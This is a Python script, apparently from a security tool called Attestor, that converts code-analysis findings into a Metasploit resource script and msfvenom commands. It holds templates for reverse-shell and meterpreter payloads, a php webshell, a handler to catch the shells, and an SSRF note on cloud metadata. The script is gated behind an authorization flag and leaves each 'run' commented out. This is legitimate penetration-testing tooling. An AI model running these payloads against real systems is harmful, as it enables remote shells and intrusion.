#!/usr/bin/env python3
"""Metasploit bridge -- turn Attestor findings into a loaded Metasploit plan.

House contract (offensive lane -- read this):
- GENERATOR ONLY. This writes a Metasploit resource script (.rc) and msfvenom
  commands. It NEVER launches msfconsole, never connects to anything, never
  attacks. Running the generated artifacts against a target is the operator's
  deliberate action and responsibility.
- The operator must supply the TARGET explicitly (RHOSTS / URL). Nothing is
  baked in. Use only against systems you are authorized to test.
- Gated behind --yes-authorized; not wired into the default `attestor` CLI.

Workflow: attestor confirm <code>  ->  feed those findings here  ->  msfconsole -r plan.rc
The mapping from a source-code finding class to an MSF module is best-effort
scaffolding (the exact module depends on the target's stack); every block is
commented so you adjust the module before running.
"""
from __future__ import annotations

import argparse
import json
import os
import sys
from dataclasses import dataclass, field

_HERE = os.path.dirname(os.path.abspath(__file__))
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)

BANNER = "  [MSF Bridge] Generates a Metasploit plan for AUTHORIZED targets only.\n"

# finding class / CWE -> Metasploit scaffolding
MSF_MAP: dict[str, dict] = {
    "command_injection": {
        "cwe": "CWE-78",
        "modules": ["exploit/multi/http/<app>_exec  # pick the module for the target stack",
                    "auxiliary/scanner/http/http_header"],
        "payload": "cmd/unix/reverse_bash",
        "venom": "msfvenom -p cmd/unix/reverse_bash LHOST={lhost} LPORT={lport} -f raw",
        "note": "OS command injection -> reverse shell via the injected command.",
    },
    "code_injection": {
        "cwe": "CWE-94",
        "modules": ["exploit/multi/http/<app>_code_exec"],
        "payload": "python/meterpreter/reverse_tcp",
        "venom": "msfvenom -p python/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw",
        "note": "Server-side code injection / SSTI -> in-language payload.",
    },
    "deserialization": {
        "cwe": "CWE-502",
        "modules": ["exploit/multi/http/<app>_deserialization"],
        "payload": "java/meterpreter/reverse_tcp",
        "venom": "msfvenom -p java/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw  # or ysoserial gadget",
        "note": "Insecure deserialization -> gadget-chain RCE.",
    },
    "sql_injection": {
        "cwe": "CWE-89",
        "modules": ["auxiliary/admin/http/<app>_sqli",
                    "# consider sqlmap for extraction; MSF for known-CVE SQLi modules"],
        "payload": "",
        "venom": "",
        "note": "SQL injection -> data extraction / stacked-query RCE where supported.",
    },
    "ssrf": {
        "cwe": "CWE-918",
        "modules": ["auxiliary/scanner/http/ssrf_gateway",
                    "auxiliary/scanner/http/http_get"],
        "payload": "",
        "venom": "",
        "note": "SSRF -> reach internal services / cloud metadata (169.254.169.254).",
    },
    "path_traversal": {
        "cwe": "CWE-22",
        "modules": ["auxiliary/scanner/http/dir_traversal",
                    "auxiliary/scanner/http/files_dir"],
        "payload": "",
        "venom": "",
        "note": "Path traversal -> arbitrary file read.",
    },
    "file_upload": {
        "cwe": "CWE-434",
        "modules": ["exploit/multi/http/<app>_upload_exec"],
        "payload": "php/meterpreter/reverse_tcp",
        "venom": "msfvenom -p php/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o shell.php",
        "note": "Unrestricted upload -> webshell / meterpreter.",
    },
    "xss": {
        "cwe": "CWE-79",
        "modules": ["# MSF has limited XSS tooling; consider BeEF for browser exploitation"],
        "payload": "",
        "venom": "",
        "note": "XSS -> session/credential theft; not a native MSF strength.",
    },
}

# CWE -> class, to accept findings that only carry a CWE
_CWE_TO_CLASS = {v["cwe"]: k for k, v in MSF_MAP.items()}


@dataclass
class Plan:
    target: str
    lhost: str
    lport: str
    findings: list[dict] = field(default_factory=list)
    matched: list[dict] = field(default_factory=list)   # (finding, mapping)


def _classify(finding: dict) -> tuple[str, dict] | None:
    kind = (finding.get("sink_type") or finding.get("category")
            or finding.get("vulnerability") or "").lower().replace("-", "_")
    if kind in MSF_MAP:
        return kind, MSF_MAP[kind]
    cwe = finding.get("cwe") or finding.get("sink_cwe") or ""
    if cwe in _CWE_TO_CLASS:
        k = _CWE_TO_CLASS[cwe]
        return k, MSF_MAP[k]
    return None


def build_plan(findings: list[dict], target: str, lhost: str, lport: str) -> Plan:
    plan = Plan(target=target, lhost=lhost, lport=lport, findings=findings)
    for f in findings:
        c = _classify(f)
        if c:
            plan.matched.append({"finding": f, "class": c[0], "map": c[1]})
    return plan


def generate_rc(plan: Plan) -> str:
    L = [
        "# ============================================================",
        "# Metasploit resource script -- generated by Attestor msf_bridge",
        "# AUTHORIZED TESTING ONLY. Review every module before running.",
        f"# Target: {plan.target}    LHOST: {plan.lhost}  LPORT: {plan.lport}",
        "# ============================================================",
        "",
        "setg RHOSTS " + (plan.target or "TARGET_HOST_OR_URL"),
        f"setg LHOST {plan.lhost}",
        f"setg LPORT {plan.lport}",
        "",
    ]
    if not plan.matched:
        L.append("# (no findings mapped to a Metasploit module)")
    for i, m in enumerate(plan.matched, 1):
        f = m["finding"]
        mp = m["map"]
        loc = f"{f.get('sink_file', f.get('file',''))}:{f.get('sink_line', f.get('line',''))}"
        L += [
            f"# --- finding {i}: {m['class']} ({mp['cwe']}) at {loc} ---",
            f"# {mp['note']}",
        ]
        primary = mp["modules"][0]
        L.append(f"use {primary}")
        for extra in mp["modules"][1:]:
            L.append(f"#   alt: {extra}")
        if mp.get("payload"):
            L.append(f"set PAYLOAD {mp['payload']}")
        L += ["# set TARGETURI / RPORT as appropriate for this app",
              "# run", ""]   # run left commented -- operator enables deliberately
    # generic catcher for reverse shells
    payloads = {m["map"]["payload"] for m in plan.matched if m["map"].get("payload")}
    if payloads:
        L += ["# --- handler: catch the reverse shell(s) ---",
              "use exploit/multi/handler",
              f"set PAYLOAD {sorted(payloads)[0]}",
              f"set LHOST {plan.lhost}", f"set LPORT {plan.lport}",
              "# run -j", ""]
    return "\n".join(L)


def generate_venom(plan: Plan) -> list[str]:
    cmds = []
    seen = set()
    for m in plan.matched:
        v = m["map"].get("venom")
        if v and v not in seen:
            seen.add(v)
            cmds.append(v.format(lhost=plan.lhost, lport=plan.lport))
    return cmds


def render(plan: Plan, rc: str, venom: list[str]) -> str:
    out = [BANNER,
           f"  Mapped {len(plan.matched)}/{len(plan.findings)} finding(s) to Metasploit.",
           "  " + "=" * 58, "", "  --- resource script (.rc) ---", rc]
    if venom:
        out += ["", "  --- msfvenom payloads ---"] + [f"  {c}" for c in venom]
    out += ["", "  Run with:  msfconsole -r <plan>.rc",
            "  Every 'run' is left COMMENTED -- enable each deliberately."]
    return "\n".join(out)


def _load_findings(args) -> list[dict]:
    if args.findings:
        with open(args.findings, encoding="utf-8") as f:
            data = json.load(f)
        return data if isinstance(data, list) else data.get("results", data.get("findings", []))
    if args.scan:
        import dataflow, confirm
        confs = confirm.confirm_paths([args.scan])
        # prefer confirmed; fall back to all dataflow findings
        confirmed = [confirm.to_dict([c])[0] for c in confs if c.status == "CONFIRMED"]
        if confirmed:
            return confirmed
        return dataflow.to_dict(dataflow.scan_paths([args.scan]))
    return []


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(
        prog="attestor-msf-bridge",
        description="Generate a Metasploit plan from Attestor findings (authorized use only).",
        formatter_class=argparse.RawDescriptionHelpFormatter, epilog=__doc__)
    src = ap.add_mutually_exclusive_group(required=True)
    src.add_argument("--findings", help="JSON findings file (from attestor --json)")
    src.add_argument("--scan", help="scan a code path (runs dataflow+confirm) to derive findings")
    ap.add_argument("--target", default="", help="RHOSTS / target URL you are authorized to test")
    ap.add_argument("--lhost", default="LHOST", help="your listener host")
    ap.add_argument("--lport", default="4444", help="your listener port")
    ap.add_argument("--out", "-o", help="write the .rc to this file")
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--yes-authorized", action="store_true",
                    help="confirm you are authorized to test the target")
    args = ap.parse_args(argv)

    if not args.yes_authorized:
        sys.stderr.write(BANNER)
        sys.stderr.write("  Refusing without --yes-authorized (attest you have permission).\n")
        return 2

    findings = _load_findings(args)
    plan = build_plan(findings, args.target, args.lhost, args.lport)
    rc = generate_rc(plan)
    venom = generate_venom(plan)

    if args.out:
        with open(args.out, "w", encoding="utf-8") as f:
            f.write(rc + "\n")
        sys.stderr.write(f"  wrote {args.out}\n")

    if args.json:
        print(json.dumps({"target": plan.target, "mapped": len(plan.matched),
                          "total": len(plan.findings), "rc": rc, "msfvenom": venom}, indent=2))
    else:
        print(render(plan, rc, venom))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
